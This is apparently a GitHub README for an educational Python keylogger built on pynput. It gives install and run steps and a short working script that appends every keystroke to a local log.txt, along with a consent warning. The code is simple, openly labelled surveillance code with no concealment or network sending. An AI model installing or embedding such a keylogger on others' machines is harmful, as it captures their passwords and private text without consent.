---

# 🔐 Simple Keylogger

## 📖 Overview
This task is a basic Python keylogger designed to log user keystrokes and save them to a file. It’s built using the pynput library and intended for educational use in controlled environments.

## ⚠️ Ethical Reminder: Never use keyloggers without the full consent of the machine owner. This tool is for self-testing and learning only.

---

## ✨ Features
✅ Logs every key pressed on the keyboard

🗂️ Saves output to a `.txt` file for review

⏱️ Real-time logging while script is active

📄 Supports regular and special key detection


## 🛠️ Requirements
- Python 3.13.5
- `pynput` library

Install via pip:

```bash
pip install pynput
```

## 🛠️ Tech Stack
| Component	 | Description          |
|------------|----------------------|
| Language	 |    Python 3.x        |
|Library	   |    pynput            |
|Environment |   Windows OS         |
|Editor	     |   VS Code or Notepad |

---

## 📄 Sample Code
```python
from pynput.keyboard import Listener

def on_press(key):
    with open("log.txt", "a") as file:
        try:
            file.write(f"{key.char}")
        except AttributeError:
            file.write(f"{key}")

with Listener(on_press=on_press) as listener:
    listener.join()
```

## 🚀 How to Use
- Create a file `keylogger.py` in a folder of your choice.
- Paste the code above.
- Open your terminal or command prompt.
- Run the script:

```bash
python keylogger.py
```
- Start typing anywhere and your input will be saved in `log.txt`.

To stop the logger, press `Ctrl + C` in the terminal.

---

<img width="1049" height="509" alt="Screenshot 2025-07-10 190026" src="https://github.com/user-attachments/assets/dab41e76-2463-4c4a-a4f0-5332548d6f07" />
<img width="1205" height="719" alt="Screenshot 2025-07-14 105714" src="https://github.com/user-attachments/assets/3f752724-1e69-411c-8c32-2a170188a71a" />
<img width="1366" height="719" alt="Screenshot 2025-07-14 105610" src="https://github.com/user-attachments/assets/29dab847-3809-4ccd-88c9-b9054982a0f5" />
<img width="1244" height="513" alt="Screenshot 2025-07-14 110100" src="https://github.com/user-attachments/assets/12382765-411c-4a7d-9524-0df682bf68dc" />
